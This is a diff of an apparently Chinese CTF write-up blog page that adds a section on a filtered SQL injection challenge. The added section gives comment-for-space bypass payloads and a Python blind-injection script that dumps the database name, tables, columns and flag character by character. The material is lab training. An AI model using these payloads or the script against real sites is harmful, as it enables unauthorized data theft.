@@ -35,8 +35,13 @@
 <meta property="og:image" content="http://example.com/images/9.png">
 <meta property="og:image" content="http://example.com/images/10.png">
 <meta property="og:image" content="http://example.com/images/11.png">
+<meta property="og:image" content="http://example.com/images/555.png">
+<meta property="og:image" content="http://example.com/images/23.png">
+<meta property="og:image" content="http://example.com/images/233.png">
+<meta property="og:image" content="http://example.com/images/2333.png">
+<meta property="og:image" content="http://example.com/images/23333.png">
 <meta property="article:published_time" content="2023-04-24T16:00:00.000Z">
-<meta property="article:modified_time" content="2023-04-26T13:54:46.225Z">
+<meta property="article:modified_time" content="2023-05-03T14:37:45.601Z">
 <meta property="article:author" content="奇怪的奇怪">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://example.com/images/fuck.png">
@@ -249,7 +254,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          3.6k 字
+          4.9k 字
         
       </span>
     
@@ -260,7 +265,7 @@
         
         
         
-          30 分钟
+          42 分钟
         
       </span>
     
@@ -398,6 +403,23 @@
 <p>爆字段值</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">-<span class="hljs-number">1</span><span class="hljs-regexp">/**/u</span>nion<span class="hljs-regexp">/**/</span>select<span class="hljs-regexp">/**/</span><span class="hljs-number">1</span>,(select<span class="hljs-regexp">/**/</span>flag<span class="hljs-regexp">/**/</span>from<span class="hljs-regexp">/**/</span>flag),<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure>
 <p>成功获取flag值</p>
+<h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p>本题过滤了空格，逗号，and，union等关键字<br>空格依旧是用&#x2F;**&#x2F;替代<br>and可使用or 替代</p>
+<p>首先狠狠的注入，输入以下payload使sql恒成立</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?id=-<span class="hljs-number">1</span><span class="hljs-regexp">/**/</span>or<span class="hljs-regexp">/**/</span><span class="hljs-number">1</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<p>由于sql恒成立，数据库将查询出表中的所有内容，并返回到前端展示<br><img src="/images/555.png" srcset="/img/loading.gif" lazyload></p>
+<p>在输入以下payload使sql恒不成立</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?id=-<span class="hljs-number">1</span><span class="hljs-regexp">/**/</span>or<span class="hljs-regexp">/**/</span><span class="hljs-number">1</span>=<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>
+
+<p>由于sql恒不成立，数据库查询不到任何数据，从而导致页面空显示</p>
+<p>由以上结果可知，该页面存在sql注入，注入点为数值型注入</p>
+<p>接下来进行脱库，由于盲注脱库比较复杂，此处我们拿抄来的python脚本😊进行自动化脱库，注意payload中的字符串不换行，否则可能会出问题</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">import requests<br> <br>url = &#x27;http://9d1bf0f8-9f4f-4cd2-bd17-a1024a0d065c.challenge.ctf.show/index.php?id=-1<span class="hljs-comment">/**/</span>or<span class="hljs-comment">/**/</span>&#x27;<br>name = &#x27;&#x27;<br> <br># 循环45次( 循环次数按照返回的字符串长度自定义)<br>for i in range(1, 45):<br>    # 获取当前使用的数据库<br>    # payload = &#x27;ascii(substr(database()from<span class="hljs-comment">/**/</span>%d<span class="hljs-comment">/**/</span>for<span class="hljs-comment">/**/</span>1))=%d&#x27;<br>    # 获取当前数据库的所有表<br>    # payload = &#x27;ascii(substr((<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(table_name)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.tables<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>table_schema=<span class="hljs-keyword">database</span>())<span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>%d<span class="hljs-comment">/**/</span><span class="hljs-keyword">for</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>))=%d<span class="hljs-string">&#x27;</span><br><span class="hljs-string">    # 获取flag表的字段</span><br><span class="hljs-string">    # payload = &#x27;</span>ascii(<span class="hljs-built_in">substr</span>((<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(column_name)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.columns<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>table_name=<span class="hljs-number">0x666C6167</span>)<span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>%d<span class="hljs-comment">/**/</span><span class="hljs-keyword">for</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>))=%d<span class="hljs-string">&#x27;</span><br><span class="hljs-string">    # 获取flag表的数据</span><br><span class="hljs-string">    payload = &#x27;</span>ascii(<span class="hljs-built_in">substr</span>((<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>flag<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>flag)<span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>%d<span class="hljs-comment">/**/</span><span class="hljs-keyword">for</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>))=%d<span class="hljs-string">&#x27;</span><br><span class="hljs-string">    count = 0</span><br><span class="hljs-string">    print(&#x27;</span>正在获取第 %d 个字符<span class="hljs-string">&#x27; % i)</span><br><span class="hljs-string">    # 截取SQL查询结果的每个字符, 并判断字符内容</span><br><span class="hljs-string">    for j in range(31, 128):</span><br><span class="hljs-string">        result = requests.get(url + payload % (i, j))</span><br><span class="hljs-string"> </span><br><span class="hljs-string">        if &#x27;</span><span class="hljs-keyword">If</span><span class="hljs-string">&#x27; in result.text:</span><br><span class="hljs-string">            name += chr(j)</span><br><span class="hljs-string">            print(&#x27;</span>数据库名/表名/字段名/数据: %s<span class="hljs-string">&#x27; % name)</span><br><span class="hljs-string">            break</span><br><span class="hljs-string"> </span><br><span class="hljs-string">        # 如果某个字符不存在,则停止程序</span><br><span class="hljs-string">        count += 1</span><br><span class="hljs-string">        if count &gt;= (128 - 31):</span><br><span class="hljs-string">            exit()</span><br></code></pre></td></tr></table></figure>
+
+<p>获取数据库<br><img src="/images/23.png" srcset="/img/loading.gif" lazyload></p>
+<p>获取表<br><img src="/images/233.png" srcset="/img/loading.gif" lazyload></p>
+<p>获取字段<br><img src="/images/2333.png" srcset="/img/loading.gif" lazyload></p>
+<p>获取flag<br><img src="/images/23333.png" srcset="/img/loading.gif" lazyload></p>
 
                 
               </div>
